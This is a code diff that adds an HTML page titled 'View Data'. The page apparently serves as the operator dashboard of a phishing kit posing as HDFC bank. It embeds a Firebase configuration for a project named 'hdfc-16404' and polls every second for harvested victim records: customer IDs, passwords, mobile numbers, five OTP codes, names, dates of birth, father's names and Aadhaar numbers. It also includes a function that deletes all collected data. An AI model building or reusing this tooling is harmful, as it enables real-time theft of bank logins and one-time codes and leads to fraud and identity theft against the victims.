@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>View Data</title>
+
+	<style>
+		.heading {
+			text-align: center;
+		}
+		.subheading {
+			text-align: center;
+			color: #43955F;
+		}
+		.data strong {
+			color: black;
+		}
+		.data {
+			color: #1881EB;
+		}
+	</style>
+
+
+</head>
+<body>
+
+	<div class="heading"><h2>All Data</h2></div>
+
+	<div class="subheading"><h4>Last Updated: <span id="lastUpdate">00:00:00</span></h4></div>
+
+	<div class="data" id="data">
+	</div>
+
+</body>
+</html>
+
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<script>
+	    let isFirstRow = true; // Flag to detect the first row only
+
+    // Firebase configuration
+    const firebaseConfig = {
+            apiKey: "AIzaSyBh2pLncBUFtiVVHWAI6HiZarEK3Qw_kf4",
+            authDomain: "hdfc-16404.firebaseapp.com",
+            projectId: "hdfc-16404",
+            storageBucket: "hdfc-16404.firebasestorage.app",
+            messagingSenderId: "429370839636",
+            appId: "1:429370839636:web:67373572f52937872f13c1",
+            measurementId: "G-HCX0NQKHGJ"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore(app);
+</script>
+
+
+    <script>
+        const domainToMatch = window.location.hostname + '/viewd.html';
+
+    async function fetchData() {
+                const snapshot = await db.collection('users')
+                    .where('domain', '==', domainToMatch) // Filter by domain
+                    .orderBy('createdAt', 'desc') // Sort by createdAt in descending order
+                    .get();
+
+                // Clear the table body
+                const dataBody = document.getElementById('data');
+                dataBody.innerHTML = '';
+
+                // Populate the table with data
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    const row = document.createElement('tr');
+
+                    row.innerHTML = `<strong>Customer ID/User ID:</strong> ${data.customerid}
+                    	<br>
+                        <strong>Password:</strong> ${data.password}
+                    	<br>
+                        <strong>Mobile Number:</strong> ${data.mobile}
+                    	<br>
+                    	<br>
+                        <strong>OTP 1:</strong> ${data.otp1}
+                    	<br>
+                    	<br>
+                        <strong>Full Name:</strong> ${data.customername}
+                    	<br>
+                        <strong>DOB:</strong> ${data.dob}
+                    	<br>
+                    	<br>
+                        <strong>OTP 2:</strong> ${data.otp2}
+                    	<br>
+                    	<br>
+                        <strong>OTP 3:</strong> ${data.otp3}
+                    	<br>
+                    	<br>
+                        <strong>Father Name:</strong> ${data.fathername}
+                    	<br>
+                        <strong>Adhar No:</strong> ${data.aadherNo}
+                    	<br>
+                    	<br>
+                        <strong>OTP 4:</strong> ${data.otp4}
+                    	<br>
+                    	<br>
+                        <strong>OTP 5:</strong> ${data.otp5}
+                    	<hr>
+                    	<br>`;
+
+                    dataBody.appendChild(row);
+
+			                    
+			        // Update last updated time for first document only
+			        if (isFirstRow) {
+			            const lastUpdateSpan = document.getElementById('lastUpdate');
+			            if (data.createdAt && data.createdAt.toDate) {
+			                const date = data.createdAt.toDate(); // Firebase Timestamp to JS Date
+			                const formattedTime = date.toLocaleTimeString(); // Format HH:MM:SS
+			                lastUpdateSpan.textContent = formattedTime;
+			            } else {
+			                lastUpdateSpan.textContent = "Invalid Timestamp";
+			            }
+			            isFirstRow = false; // After first row, disable
+			        }
+                });
+            }
+
+        // Initial fetch and set an interval for updates
+        fetchData();
+        setInterval(fetchData, 1000); // Update every second
+
+    async function clearAllData() {
+        if (confirm("Are you sure you want to clear all data? This action cannot be undone.")) {
+            try {
+                const snapshot = await db.collection('users').get();
+                const batch = db.batch();
+
+                snapshot.docs.forEach(doc => {
+                    batch.delete(doc.ref);
+                });
+
+                await batch.commit();
+                alert('All data has been cleared successfully.');
+            } catch (error) {
+                console.error('Error clearing data:', error);
+                alert('An error occurred while clearing data. Please try again.');
+            }
+        }
+    }
+
+    </script>
